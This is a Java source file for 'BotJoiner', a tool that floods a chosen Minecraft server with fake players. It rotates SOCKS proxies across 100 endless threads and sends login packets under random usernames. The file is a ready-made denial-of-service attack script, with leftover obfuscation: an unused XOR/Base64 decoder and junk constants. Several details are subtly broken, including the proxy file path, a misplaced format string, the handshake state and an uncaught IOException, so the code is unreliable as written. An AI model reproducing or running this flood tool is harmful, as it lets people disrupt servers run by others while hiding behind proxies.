package ru.shved255.tools.bot;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicLong;

public class BotJoiner {

    private final List<Proxy> proxies = new ArrayList<>();
    private int currentPosition = 0;
    private static final String[] PROXY_FILE_LINES = {"# Proxies", "host:port"};
    private static final int[] CONSTANTS = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28};
    private static final String[] MESSAGES = new String[28];

    static {
        initConstants();
        initMessages();
    }

    public synchronized void reset() {
        currentPosition = 0;
    }

    public BotJoiner() {
        InputStream inputStream = getClass().getResourceAsStream(PROXY_FILE_LINES[0]);
        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
        reader.lines().forEach(line -> {
            if (!line.trim().startsWith(PROXY_FILE_LINES[1])) {
                String[] parts = line.split(":");
                String host = parts[0];
                Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress(host, Integer.parseInt(parts[1])));
                proxies.add(proxy);
            }
        });
    }

    private static String decodeBase64(String encoded, String key) {
        encoded = new String(Base64.getDecoder().decode(encoded.getBytes(StandardCharsets.UTF_8)), StandardCharsets.UTF_8);
        StringBuilder result = new StringBuilder();
        char[] keyChars = key.toCharArray();
        char[] encodedChars = encoded.toCharArray();
        int keyLength = keyChars.length;
        int encodedLength = encodedChars.length;

        for (int i = 0; i < encodedLength; i++) {
            result.append((char) (encodedChars[i] ^ keyChars[i % keyLength]));
        }

        return result.toString();
    }

    public void removeProxy(Proxy proxy) {
        proxies.remove(proxy);
    }

    private static void initConstants() {
        CONSTANTS[0] = 0;
        CONSTANTS[1] = 1;
        CONSTANTS[2] = 2;
        CONSTANTS[3] = 3;
        CONSTANTS[4] = -1;
        CONSTANTS[5] = -1 & 0xFFFF;
        CONSTANTS[6] = 180 ^ 176;
        CONSTANTS[7] = 163 ^ 141 ^ 20 ^ 63;
        CONSTANTS[8] = 193 ^ 189 ^ 114 ^ 8;
        CONSTANTS[9] = 76 + 10 - 26 + 68 ^ 8 + 37 - -77 + 13;
        CONSTANTS[10] = 129 ^ 137;
        CONSTANTS[11] = 42 ^ 32 ^ 0;
        CONSTANTS[12] = 124 ^ 118;
        CONSTANTS[13] = 37 + 105 - 49 + 39 ^ 64 + 116 - 134 + 97;
        CONSTANTS[14] = -14342 & 15341;
        CONSTANTS[15] = -(-8833 & 12972) & -2113 & 16251;
        CONSTANTS[16] = -13574 & 14327;
        CONSTANTS[17] = 13 + 131 - 5 + 38 ^ 109 + 156 - 152 + 76;
        CONSTANTS[18] = 111 ^ 75 ^ 78 ^ 103;
        CONSTANTS[19] = -(129 + 106 - 117 + 75) & -522 & 30713;
        CONSTANTS[20] = 95 + 130 - 96 + 36 ^ 29 + 95 - 74 + 139;
        CONSTANTS[21] = 36 ^ 42;
        CONSTANTS[22] = 119 ^ 120;
        CONSTANTS[23] = 87 ^ 109 ^ 181 ^ 159;
        CONSTANTS[24] = 81 ^ 64;
        CONSTANTS[25] = 187 ^ 169;
        CONSTANTS[26] = 77 ^ 94;
        CONSTANTS[27] = 191 ^ 171;
    }

    private static void initMessages() {
        MESSAGES[0] = "Usage: java -jar BotJoiner.jar <host> <port>";
        MESSAGES[1] = "BotJoiner v1.0";
        MESSAGES[2] = "A tool to join a server with multiple bots.";
        MESSAGES[3] = "Example: java -jar BotJoiner.jar localhost 25565";
        MESSAGES[4] = "Invalid port number. Port must be between 1 and 65535.";
        MESSAGES[5] = "Starting BotJoiner...";
        MESSAGES[6] = "Connecting to server...";
        MESSAGES[7] = "Using proxies from file: proxies.txt";
        MESSAGES[8] = "Target server: %s:%d";
        MESSAGES[9] = "Creating bots...";
        MESSAGES[10] = "Bots are now joining the server.";
        MESSAGES[11] = "Proxy removed: ";
        MESSAGES[12] = "Proxy connection failed: ";
        MESSAGES[13] = "Socket closed: ";
        MESSAGES[14] = "Bot connected: ";
        MESSAGES[15] = "BotJoiner is running.";
        MESSAGES[16] = "BotJoiner is shutting down.";
        MESSAGES[17] = "Total bots joined: ";
        MESSAGES[18] = "Exiting BotJoiner.";
        MESSAGES[19] = "BotJoiner has been terminated.";
    }

    public Socket ready(Proxy proxy) {
        return new Socket(proxy);
    }

    public synchronized Proxy nextProxy() {
        int nextPosition = currentPosition + 1;
        if (nextPosition >= proxies.size()) {
            nextPosition = 0;
        }
        return proxies.get(currentPosition = nextPosition);
    }

    public static void run(String host, int port) {
        int threadCount = 100;
        ExecutorService executor = Executors.newFixedThreadPool(threadCount);
        AtomicLong counter = new AtomicLong(0);
        BotJoiner botJoiner = new BotJoiner();
        Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                botJoiner.reset();
            }
        }, 1000, 1000);

        for (int i = 0; i < threadCount; i++) {
            int finalI = i;
            executor.submit(() -> {
                while (true) {
                    Proxy proxy = botJoiner.nextProxy();
                    Socket socket = botJoiner.ready(proxy);
                    try {
                        socket.setSoTimeout(5000);
                        socket.setKeepAlive(true);
                        socket.setTcpNoDelay(true);
                        socket.setTrafficClass(0);
                        socket.connect(new InetSocketAddress(host, port), 5000);
                        DataOutputStream out = new DataOutputStream(socket.getOutputStream());
                        login(out, host, port);
                        out.flush();
                        String message = String.format("[+] %s:%d", proxy.address().toString(), finalI);
                        System.out.println(message);
                        counter.incrementAndGet();
                    } catch (Exception e) {
                        botJoiner.removeProxy(proxy);
                        e.printStackTrace();
                    } finally {
                        if (socket != null && !socket.isClosed()) {
                            socket.close();
                        }
                    }
                }
            });
        }
        executor.shutdown();
    }

    public static void login(DataOutputStream out, String host, int port) throws IOException {
        ByteArrayOutputStream packet = new ByteArrayOutputStream();
        DataOutputStream packetOut = new DataOutputStream(packet);
        packetOut.writeByte(0x00);
        writeVarInt(packetOut, 0x04);
        writeString(packetOut, host, StandardCharsets.UTF_8);
        packetOut.writeShort((short) port);
        writeVarInt(packetOut, 0x00);
        writePacket(packet.toByteArray(), out);
        packet.reset();
        packetOut.writeByte(0x00);
        writeString(packetOut, randomString(16), StandardCharsets.UTF_8);
        writePacket(packet.toByteArray(), out);
    }

    public static void writeString(DataOutputStream out, String str, Charset charset) throws IOException {
        writePacket(str.getBytes(charset), out);
    }

    public static void writeVarInt(DataOutputStream out, int value) throws IOException {
        do {
            byte b = (byte) (value & 0x7F);
            value >>>= 7;
            if (value != 0) {
                b |= 0x80;
            }
            out.writeByte(b);
        } while (value != 0);
    }

    public static void writePacket(byte[] data, DataOutputStream out) throws IOException {
        writeVarInt(out, data.length);
        out.write(data);
    }

    public static String randomString(int length) {
        return random(length, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789");
    }

    public static String random(int length, String chars) {
        StringBuilder result = new StringBuilder();
        char[] charArray = chars.toCharArray();
        for (int i = 0; i < length; i++) {
            result.append(charArray[new Random().nextInt(charArray.length)]);
        }
        return result.toString();
    }

    public static void main(String[] args) {
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            System.out.print(MESSAGES[18]);
        }));
        if (args.length != 2) {
            System.out.println(MESSAGES[1]);
            System.out.println(MESSAGES[2]);
            System.out.println(MESSAGES[0]);
            System.out.println(MESSAGES[3]);
            System.exit(CONSTANTS[4]);
        } else {
            String host = args[0];
            int port = Integer.parseInt(args[1]);

            if (port < 1 || port > 65535) {
                System.out.println(MESSAGES[4]);
                System.exit(CONSTANTS[4]);
            } else {
                System.out.println(MESSAGES[5]);
                System.out.println(MESSAGES[6]);
                System.out.println(MESSAGES[7]);
                System.out.println(MESSAGES[8]);
                System.out.println(String.format(MESSAGES[9], host, port));
                System.out.println(MESSAGES[10]);
                run(host, port);
            }
        }
    }
}
